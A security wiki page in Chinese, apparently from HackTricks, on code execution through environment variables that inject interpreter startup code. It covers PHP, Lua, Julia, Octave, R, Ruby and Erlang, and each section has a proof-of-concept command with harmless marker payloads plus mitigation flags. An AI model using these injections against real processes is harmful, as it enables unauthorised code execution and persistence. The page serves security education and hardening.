# macOS 通过环境变量注入解释器启动项

{{#include ../../../banners/hacktricks-training.md}}

这些特定于运行时的技术利用继承的环境变量，在预期工作负载启动前选择启动配置、预加载代码或提供 VM 标志。部分变体依赖文件；Lua 和 Erlang 还支持执行内联代码。

## PHP 启动配置

### `PHPRC` / `PHP_INI_SCAN_DIR` 和 `auto_prepend_file`

PHP CLI 和 CGI 会在每次调用时读取配置。`PHPRC` 可以指定攻击者可读取的 `php.ini`，而 `PHP_INI_SCAN_DIR` 可以重定向用于扫描其他 `.ini` 文件的目录。`auto_prepend_file` 指令会使 PHP 在执行请求的脚本前解析某个文件，因此这种组合可以实现启动时代码执行。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

另一种选择是包含 `.ini` 文件的目录：

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

`-n` 选项会忽略 `php.ini`；显式指定的可信 `-c` 路径优先于 `PHPRC`。请记住，长时间运行的服务器 SAPI 通常会在 Web 服务器启动时读取配置，而 CLI 和 CGI 则会在每次调用时读取配置。<sup>[[1]](#references)</sup>

## Lua 启动代码

### `LUA_INIT`

在处理命令行选项或目标脚本之前，独立的 Lua 解释器会执行 `LUA_INIT_<major>_<minor>`；如果该版本变量不存在，则执行 `LUA_INIT`。以 `@` 开头的值表示文件名；其他值则会直接作为 Lua 代码执行。这样既可通过文件执行启动代码，也可不依赖文件直接执行代码。<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

具体的版本化名称会随解释器变化，例如 `LUA_INIT_5_4`。`lua -E` 会忽略所有环境变量，包括启动代码和 Lua 模块路径。

## Julia 启动 depot

### `JULIA_DEPOT_PATH` 和 `startup.jl`

Julia 通常会在启动时执行其第一个 depot 中的 `config/startup.jl`。`JULIA_DEPOT_PATH` 控制 depot 列表，因此将其指向攻击者可读取的目录树，就会重定向自动加载的启动文件。<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

末尾的分隔符很有用，因为受害者可能仍需要使用其正常的软件包。`julia --startup-file=no` 会禁用此启动文件。启动前清除该变量，因为它还控制软件包注册表、环境、缓存和代码加载位置。

## GNU Octave 启动文件

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave 会在启动期间执行多个包含有效 Octave 命令的文件。`OCTAVE_SITE_INITFILE` 会覆盖站点级启动文件，`OCTAVE_VERSION_INITFILE` 会覆盖特定版本的启动文件，因此任一变量都可将自动执行重定向到攻击者可读取的文件。<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` 只会跳过 `~/.octaverc` 等用户文件；它**不会**阻止上面的 site-file 覆盖。使用 `--no-site-file` 禁用 site files，或使用 `--norc` / `-f` 禁用所有启动文件。<sup>[[7]](#references)</sup>

## R 启动配置文件与 package 加载

### `R_PROFILE_USER` / `R_PROFILE`

启动时，R 会加载包含 R 代码的 site 和 user 配置文件。`R_PROFILE` 用于指定 site 配置文件，`R_PROFILE_USER` 用于指定 user 配置文件，因此继承的环境可以将任一查找重定向到攻击者可读取的文件。<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` 跳过用户 profile，`--no-site-file` 跳过 site profile，而 `--vanilla` 同时启用这两项保护。R 首先处理由 `R_ENVIRON` 和 `R_ENVIRON_USER` 指定的环境文件，但这些文件只能设置变量；profile 变量才是直接执行任意代码的原语。

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` 和库路径

R 在启动期间会加载 `R_DEFAULT_PACKAGES` 中以逗号分隔的包。`Rscript` 会优先使用 `R_SCRIPT_DEFAULT_PACKAGES`。将其中任一变量与 `R_LIBS`、`R_LIBS_USER` 或 `R_LIBS_SITE` 配合使用，可以让 R 找到并加载攻击者控制的已安装包；其 `.onLoad` 或 `.onAttach` 钩子会自动执行。<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

这需要一个结构有效且已安装的 R package，而不只是一个独立的 `.R` 文件。`--vanilla` 不会清除直接继承的变量，因此可信的 wrapper 必须取消设置或替换默认 package 和 library-path 变量，同时禁用 profile 文件。

## Ruby 加载器选项

### RUBYOPT

Ruby 会在运行脚本前，从 `RUBYOPT` 环境变量中解析受支持的命令行开关。Ruby 会拒绝通过 `RUBYOPT` 中的 `-e` 执行代码，但 `-I` 可以在库搜索路径前添加目录，`-r` 则可以加载库。因此，如果某个进程使用攻击者可控的环境变量启动 Ruby，就可能被诱使加载攻击者控制的 Ruby 代码。<sup>[[10]](#references)</sup>

创建 `/tmp/inject.rb`：

```ruby:inject.rb
puts `whoami`
```

创建一个无害的 Ruby 脚本，例如 `hello.rb`：

```ruby:hello.rb
puts 'Hello, World!'
```

使用受控的 `RUBYOPT` 值运行它：

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

要禁用此行为，请在脚本名称**之前**传递 `--disable=rubyopt`（或 `--disable-rubyopt`）：<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

写在 `hello.rb` 后面的选项会通过 `ARGV` 传递给脚本；它不会禁用 Ruby 先前对 `RUBYOPT` 的处理。<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

不同于在 `RUBYOPT` 中使用 `-I` 将加载目录置于前面，独立的 `RUBYLIB` 环境变量会将目录添加到 Ruby 的 `$LOAD_PATH`。与 `RUBYOPT=-r<module>` 配合使用时，无需在 `RUBYOPT` 中使用 `-I` 即可加载攻击者代码：<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Erlang 和 Elixir VM 标志

### `ERL_AFLAGS`、`ERL_FLAGS` 和 `ERL_ZFLAGS`

`erl` 启动器会将 `ERL_AFLAGS` 添加到命令行开头，并将 `ERL_FLAGS` / `ERL_ZFLAGS` 添加到末尾。由于 `-eval` 会在 VM 初始化期间求值 Erlang 表达式，这些变量可以在预期工作负载运行前实现无文件代码执行。<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir、Mix、Phoenix 以及许多 Elixir release 最终都会启动 Erlang VM，并可能继承这些 flags。确认具体的 release wrapper：它可能会重建或清理 VM 参数，而某些工具明确支持 `ERL_AFLAGS`、`ERL_ZFLAGS` 或 `ELIXIR_ERL_OPTIONS`。<sup>[[12]](#references)</sup>

与大多数基于文件的技术不同，`-eval` payload 不需要攻击者控制的文件。可信的 wrapper 应在启动 runtime 前清除全部三个 Erlang flag 变量（Elixir 还应清除 `ELIXIR_ERL_OPTIONS`）；除非完全了解解析器和参数顺序，否则不要尝试将 VM flags 逐个加入 allowlist。

## References

- [1] [PHP 配置文件](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 独立解释器](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia 命令行界面：启动文件](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia 环境变量：`JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave 启动文件](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave 命令行选项](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [R 会话启动时的初始化](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [R 安装与管理：附加包](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Ruby 文档 - Ruby 命令行选项](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [`erl` 命令和环境变量](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Elixir releases 和 VM 环境选项](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
